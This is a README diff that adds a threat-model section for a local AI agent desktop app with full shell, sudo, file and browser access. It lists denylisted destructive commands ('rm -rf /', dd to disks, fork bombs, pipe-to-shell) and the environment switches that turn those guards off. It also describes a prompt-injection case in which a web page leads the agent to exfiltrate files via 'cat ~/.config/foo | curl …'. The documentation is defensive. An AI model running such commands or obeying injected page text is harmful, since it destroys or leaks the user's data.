@@ -225,6 +225,64 @@ instead of growing with the conversation.
 > browser-capable/code-capable turns like giving the model a shell: only point it
 > at code you're willing to have changed.
 
+## Threat model & limits
+
+Gladdis is a **trusted local desktop app**, not a sandboxed assistant. Read this
+section before pointing the agent at code or sites you care about.
+
+**What the agent can do, by design, on the OS user's behalf:**
+
+- Read and write any file the OS user can reach (no per-file confirmation).
+- Run arbitrary shell commands, including with `sudo` (passwordless on this
+  machine if the OS user has it).
+- Drive the embedded Chromium via the full Chrome DevTools Protocol — clicks,
+  typing, navigation, JavaScript injection.
+- Issue any Anthropic / Google / Grok / Codex API call the configured keys
+  authorize, and keep streaming results into your conversation.
+
+The trust boundary is **the OS user, not the model**: gladdis assumes whoever
+launched it is authorized for everything the OS user is. The model is treated
+as advisory and *deliberately* given the same reach so it can act, not just
+suggest. That is the entire point of the app.
+
+**Where the limits actually live:**
+
+| Surface | Default | How to harden |
+|---|---|---|
+| `run_command` destructive patterns (`rm -rf /`, `dd of=/dev/sd*`, fork bombs, mkfs/shred on devices, chmod -R 777 on system paths, package-purges of essential packages) | **Blocked** | Set `GLADDIS_ALLOW_DESTRUCTIVE_COMMANDS=1` to disable the denylist. |
+| `sudo` invocations | Allowed | Set `GLADDIS_REQUIRE_SUDO_CONFIRM=1` to refuse them at the tool layer. |
+| `curl … \| sh` / `wget … \| bash` and similar pipe-to-shell | Allowed | Set `GLADDIS_BLOCK_PIPE_TO_SHELL=1` to refuse them. |
+| `cdp_command` raw escape hatch on high-risk methods (`Storage.clearDataForOrigin`, `Page.setDownloadBehavior`, `Network.setRequestInterception`, `Browser.close`/`grantPermissions`, `Security.setIgnoreCertificateErrors`, …) | **Blocked** | Set `GLADDIS_CDP_ALLOW_UNSAFE=1` to disable the denylist. |
+| Per-tool toggles in the UI | Not yet | Roadmap item — until then, the env vars above are the lever. |
+
+These guards are *high-signal-only*. They catch the catastrophic mistakes
+(typos, hallucinations, prompt-injected instructions from a fetched page) and
+leave everyday work alone. They are not a sandbox.
+
+**Specifically not protected against:**
+
+- A page that prompt-injects the model into doing something hostile that is
+  not on the denylist (e.g. exfiltrating files via a benign-looking
+  `run_command` like `cat ~/.config/foo | curl …`). If the agent reads
+  untrusted page content, treat it as user input from a stranger.
+- The model deciding to overwrite a file you wanted kept. There is no undo.
+- API key leaks via screenshots, logs, or chat transcripts you share. Keys
+  themselves are stored encrypted (`safeStorage`) at `userData/gladdis-keys.json`
+  with mode `0600`, but their *use* is unaudited at the byte level.
+
+**Practical operating advice:**
+
+1. Pin the workspace folder to the project you actually want edited. The
+   workspace toggle isn't a sandbox — it's only the agent's `cwd` and the
+   resolution root for relative paths — but a wrong root is the most common
+   source of unintended writes.
+2. Commit before agent-driven sessions. `git status` is the cheapest undo.
+3. If a turn is going to fetch arbitrary web content and then act on it,
+   prefer the `ask` flavour first; act in a follow-up turn after you've read
+   what came back.
+4. For shared/multi-user machines, set the env hardening vars above in your
+   shell profile so they apply to every launch.
+
 ## Status
 
 Browser, tabs, layout, full CDP plumbing, streamed multi-provider chat, and the
